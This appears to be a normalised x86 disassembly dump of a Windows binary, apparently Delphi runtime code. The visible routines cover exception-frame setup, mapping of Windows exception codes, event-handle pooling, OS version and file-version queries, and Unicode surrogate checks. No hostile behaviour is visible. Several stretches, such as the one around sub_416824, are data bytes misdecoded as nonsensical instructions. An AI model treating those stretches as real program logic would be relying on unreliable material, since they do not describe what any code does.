xor eax eax
push ebp
push sub_41631c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40a204
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_4129f4
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_4070a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416323
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
add esp 0xfffffff0
call sub_405b0c
sub_416323
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_416344
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4070a8
mov eax [ ebp + 0x8 ]
mov [ edi + 0x8 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_41638c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_4163ec
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov eax esi
call sub_4129f4
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_4070a8
mov eax [ ebp + 0x8 ]
mov [ edi + 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4163f3
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
add esp 0xfffffff0
call sub_405b0c
sub_4163f3
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_416414
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_41646d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_411ee4
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_4070a8
mov eax [ ebp + 0x8 ]
mov [ edi + 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416474
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
add esp 0xfffffff0
call sub_405b0c
sub_416474
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_416494
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_40a204
mov eax [ ebp + 0x8 ]
mov [ edi + 0x8 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_4164dc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_41654e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_411ee4
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
call sub_4129f4
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_4070a8
mov eax [ ebp + 0x8 ]
mov [ edi + 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416555
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
add esp 0xfffffff0
call sub_405b0c
sub_416555
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_416578
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_4165ea
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40a204
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
call sub_4129f4
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_4070a8
mov eax [ ebp + 0x8 ]
mov [ edi + 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4165f1
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
add esp 0xfffffff0
call sub_405b0c
sub_4165f1
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_416614
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
lea eax [ esi + 0xc ]
call sub_418a70
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x10 ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4055e0
test bl bl
jle r-xdata
mov eax [ esi + 0x10 ]
call [ rw-data ]
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_416664
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_4070a8
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x10 ]
call [ rw-data ]
pop esi
pop ebx
retn
sub_4166b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4166e4
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call [ rw-data ]
mov edx eax
mov eax ebx
call sub_41670c
sub_4166e4
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
call sub_404288
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
call sub_4042c8
mov [ ebx + 0xc ] eax
sub_416710
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
xor edx edx
call sub_4070a8
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_4070a8
push [ esi ]
push r-xdata
push [ ebx + 0x4 ]
mov eax esi
mov edx 0x3
call sub_407648
jmp r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_4167c4
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_4043a8
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
jmp r-xdata
inc ebx
mov [ eax + 0x18 ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_416824
sub [ eax + 0x41 ] ch
add [ ebx ] al
or edx [ ebp + eax * 2 + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
jbe r-xdata
jns r-xdata
outsd
jb r-xdata
popad
jae r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] dl
add [ eax ] al
add [ eax + ebp * 2 ] ah
inc ecx
add [ ebx ] cl
je r-xdata
adc esp [ ebp + 0x74 ]
je r-xdata
insb
outsd
ja r-xdata
inc bx
adc [ ebp + 0x74 ] esp
inc ecx
imul esi [ esi + 0x42 ] 0x72655a79
outsd
or al 0x65
je r-xdata
add [ esi ] cl
jb r-xdata
jo r-xdata
jae r-xdata
or eax 0x6e497465
je r-xdata
add al 0x0
inc ebp
jb r-xdata
outsd
jb r-xdata
push esi
popad
outsb
inc ebp
jb r-xdata
xor cl [ ebx + 0x4b1db015 ]
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + ebp * 2 ] ah
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x12 ] al
inc eax
add [ eax + eax ] al
jl r-xdata
popad
insb
inc ebp
js r-xdata
popad
jae r-xdata
imul ebp [ edi + 0x6e ] 0x4d746516
je r-xdata
jb r-xdata
insb
imul esp [ ebx + eax * 2 + 0x61 ] 0x65117473
je r-xdata
imul esp [ ecx + 0x6e ] 0x72724574
outsb
jb r-xdata
add al [ eax ]
inc eax
adc al [ eax ]
add al 0x0
inc ecx
add [ eax ] al
add [ eax ] al
add [ edx ] al
push es
inc ebp
inc ebx
insb
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
and al 0x68
push ss
je r-xdata
push ebx
jbe r-xdata
je r-xdata
outsd
jb r-xdata
push ebx
mov eax edx
jmp sub_4060b0
add bl ch
sub [ edi ] ecx
mov dh 0xc0
mov ah 0x1d
dec ebx
inc ecx
imul ebp [ ebx + esi * 2 + 0x2 ] 0x697c9000
jo r-xdata
jo r-xdata
0xeb127218 0x8b32
outsd
outsb
or [ ebx + 0x79 ] dl
jae r-xdata
inc ebp
imul ebp [ edi + 0x6e ] 0x6c696146
adc esp [ fs : ebp + 0x74 ]
jb r-xdata
arpl [ ebx + 0x65 ] sp
jae r-xdata
js r-xdata
popad
imul ebp [ ebp + 0x64 ] 0x45746513
insb
outsd
ja r-xdata
add [ eax - 0x742574ad ] dl
sar dh 0x1
0xc74
add [ edx ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
outsd
outsb
or dl [ ebp + eax * 2 + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
push cs
popad
jo r-xdata
inc bx
popad
insb
insb
insb
or ah [ gs : di + 0x74 ]
inc ebx
imul esi [ edi + ebp * 2 + 0x72 ] 0x6b636f4c
inc ebp
outsd
or esp [ ebp + 0x74 ]
dec ecx
je r-xdata
imul ebp [ edi + 0x6e ] 0x4974650f
outsb
je r-xdata
add al [ eax ]
nop
push ebx
mov ebx edx
mov edx eax
imul ebp [ edi + 0x6e ] 0x4e74651b
fimul [ ebx + 0x74cafed0 ]
or al 0xfe
0x1074
je r-xdata
jne r-xdata
jb r-xdata
je r-xdata
je r-xdata
jb r-xdata
je r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x5a74650c
je r-xdata
outsb
je r-xdata
jo r-xdata
popad
jae r-xdata
inc ebx
mov edx [ rw-data ]
jmp r-xdata
dec dl
jmp r-xdata
inc ebp
js r-xdata
sbb eax 0x31eb004b
insb
jae r-xdata
je r-xdata
jo r-xdata
jbe r-xdata
outsb
add [ eax ] al
add al [ esi ]
inc ebp
dec ecx
outsb
je r-xdata
inc eax
add [ eax + eax ] al
jb r-xdata
js r-xdata
dec esp
insb
outsd
ja r-xdata
je r-xdata
je r-xdata
jb r-xdata
inc esp
imul esi [ esi + 0x69 ] 0x650a6564
je r-xdata
imul ebp [ edi + 0x6c ] 0x6f697461
outsb
or esp [ ebp + 0x74 ]
push eax
jbe r-xdata
mov eax [ eax * 4 + rw-data ]
mov dl 0x1
call sub_4160ac
mov edx eax
jmp r-xdata
push edx
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x18
jb r-xdata
call sub_4167c4
mov edx eax
dec dl
je r-xdata
jo r-xdata
add [ eax + r-xdata ] dl
adc [ edx - 0x80 ] cl
jb r-xdata
inc eax
adc al [ eax ]
outsd
arpl [ ebx + 0x45 ] bp
adc [ ebp + 0x74 ] esp
inc ecx
je r-xdata
outsd
outsb
arpl [ ebx + 0x4f ] bp
jbe r-xdata
popad
outsd
outsb
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
movzx eax [ eax ]
movzx eax al
add bl ch
xor [ ebx + 0x4b1db415 ] ecx
dec ebx
imul ebp [ edi + 0x6e ] 0x73795308
push ebp
je r-xdata
popad
jb r-xdata
jb r-xdata
insb
outsd
ja r-xdata
outsd
dec ebp
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x70707553
outsd
sbb esp [ ebp + 0x74 ]
dec esi
popad
outsb
je r-xdata
insb
inc ebx
pcmpgtw mm6 [ ebx + edx * 2 + 0x74 ]
or al 0x65
je r-xdata
je r-xdata
inc ebp
js r-xdata
push ebx
jb r-xdata
jb r-xdata
imul ebp [ edi + 0x6e ] 0x5074650b
outsb
jbe r-xdata
sub_416a1c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_416ab8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4070fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0x11
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x11
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416abf
lea eax [ ebp - 0x20 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_416b0c
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_416bac
push ebp
mov ebp esp
add esp 0xfffffd8c
push ebx
push esi
xor eax eax
mov [ ebp - 0x274 ] eax
mov [ ebp - 0x250 ] eax
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x254 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_416d67
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x270 ] eax
mov [ ebp - 0x26c ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x268 ] eax
mov [ ebp - 0x264 ] 0x11
mov [ ebp - 0x260 ] esi
mov [ ebp - 0x25c ] 0x5
lea eax [ ebp - 0x270 ]
push eax
push 0x2
lea edx [ ebp - 0x274 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x274 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
mov ebx eax
push 0x105
lea eax [ ebp - 0x22a ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameW
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x24c ] eax
mov [ ebp - 0x248 ] 0x5
lea eax [ ebp - 0x254 ]
lea edx [ ebp - 0x22a ]
mov ecx 0x105
call sub_407290
mov eax [ ebp - 0x254 ]
lea edx [ ebp - 0x250 ]
call sub_4123d8
mov eax [ ebp - 0x250 ]
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x240 ] 0x11
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x23c ] eax
mov [ ebp - 0x238 ] 0x11
mov [ ebp - 0x234 ] esi
mov [ ebp - 0x230 ] 0x5
lea eax [ ebp - 0x24c ]
push eax
push 0x3
lea edx [ ebp - 0x258 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x258 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416d6e
lea eax [ ebp - 0x274 ]
call j_sub_4068a0
lea eax [ ebp - 0x258 ]
mov edx 0x3
call j_sub_4068c4
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_416d78
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_416e42
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_416b0c
movzx eax al
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
movzx eax [ eax ]
mov eax [ eax * 4 + rw-data ]
mov dl 0x1
call sub_4160ac
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
push ebp
call sub_416bac
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416e49
lea eax [ ebp - 0x10 ]
call j_sub_4068a0
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
mov ebx eax
sub_416e50
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x18 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx ]
sub_416e84
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_416e74
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_416b8c
mov eax [ rw-data ]
mov [ eax ] sub_416d78
mov eax [ rw-data ]
mov [ eax ] sub_416e50
mov eax sub_416ad8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_416af4
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_416f14
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x18 ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0x18 ] 0x1
mov eax [ rw-data ]
call sub_4055f0
xor eax eax
mov [ rw-data ] eax
sub_416fa4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edi [ esi ]
mov [ ebx ] edi
mov eax esi
mov ecx edi
mov edx ebx
call sub_40bab0
cmp eax [ ebx ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_416fc4
push ebx
push esi
mov esi eax
mov eax ebx
pop esi
pop ebx
retn
mov edx [ ebx ]
mov eax esi
mov ecx ebx
call sub_40bab0
cmp ebx eax
jne r-xdata
mov ebx [ esi ]
test ebx ebx
je r-xdata
sub_416fe4
push ebx
push esi
push edi
xor edi edi
mov esi 0x20
mov ebx rw-data
add ebx 0x8
dec esi
jne r-xdata
push 0x0
push 0x1
push ebx
call InterlockedCompareExchange
test eax eax
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
test edi edi
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
push edi
call ResetEvent
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventW
mov edi eax
mov edi [ ebx + 0x4 ]
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventW
mov [ ebx + 0x4 ] eax
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_417048
mov ecx 0x20
mov edx rw-data
add edx 0x8
dec ecx
jne r-xdata
push 0x0
lea eax [ edx - 0x4 ]
push eax
call InterlockedExchange
retn
cmp eax [ edx ]
jne r-xdata
push eax
call CloseHandle
retn
sub_417070
push ebx
mov eax rw-data
call sub_416fc4
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventW
mov ebx eax
mov ebx [ eax + 0x4 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov edx rw-data
xchg edx eax
call sub_416fa4
jmp r-xdata
push ebx
call ResetEvent
mov eax ebx
pop ebx
retn
sub_4170b0
push ebx
mov ebx eax
mov eax rw-data
call sub_416fc4
test eax eax
jne r-xdata
mov [ eax + 0x4 ] ebx
mov edx rw-data
xchg edx eax
call sub_416fa4
pop ebx
retn
mov eax 0x8
call sub_404204
sub_4170dc
push ebx
test eax eax
je r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
push 0x0
push ecx
push edx
push eax
call SignalObjectAndWait
mov ebx eax
test eax eax
jne r-xdata
xor ebx ebx
push eax
call SetEvent
jmp r-xdata
push ecx
push edx
call WaitForSingleObject
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
sub_417120
push ebx
push esi
mov esi eax
mov ebx esi
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx ]
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov edx 0x8
mov eax ebx
call sub_404220
mov ebx esi
test ebx ebx
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call CloseHandle
sub_417150
push ebx
push esi
mov esi edx
test esi esi
jl r-xdata
pop esi
pop ebx
retn
inc esi
mov ebx eax
push 0x0
push 0x1
push ebx
call InterlockedCompareExchange
test eax eax
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call CloseHandle
add ebx 0x8
dec esi
jne r-xdata
sub_41717c
push ebx
mov ebx rw-data
push 0x0
push ebx
call InterlockedExchange
call sub_417120
mov ebx rw-data
push 0x0
push ebx
call InterlockedExchange
call sub_417120
mov eax rw-data
mov edx 0x1f
call sub_417150
pop ebx
retn
sub_4171b4
add esp 0xfffffeec
mov [ esp ] 0x114
push esp
call GetVersionExW
test eax eax
je r-xdata
add esp 0x114
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_407290
sub_417244
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41731a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0xffffffff
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4070fc
lea eax [ ebp - 0x4 ]
call j_sub_407a40
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
call GetFileVersionInfoSizeW
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417321
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov eax ebx
call sub_404204
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4172fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
call GetFileVersionInfoW
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_404220
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueW
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
sub_417330
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_41742f
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
jle r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417436
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
movzx edx [ eax + esi * 2 - 0x2 ]
cmp dx 0xd800
jb r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp eax esi
setge al
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
cmp dx 0xdfff
ja r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ eax + esi * 2 - 0x2 ] 0xd800
jb r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov bl 0x2
mov bl 0x1
jmp r-xdata
cmp [ eax + esi * 2 - 0x2 ] 0xdbff
setbe al
jmp r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
sub_417440
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4174d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp ebx eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4175cc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4174db
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov eax [ ebp - 0x4 ]
test eax eax
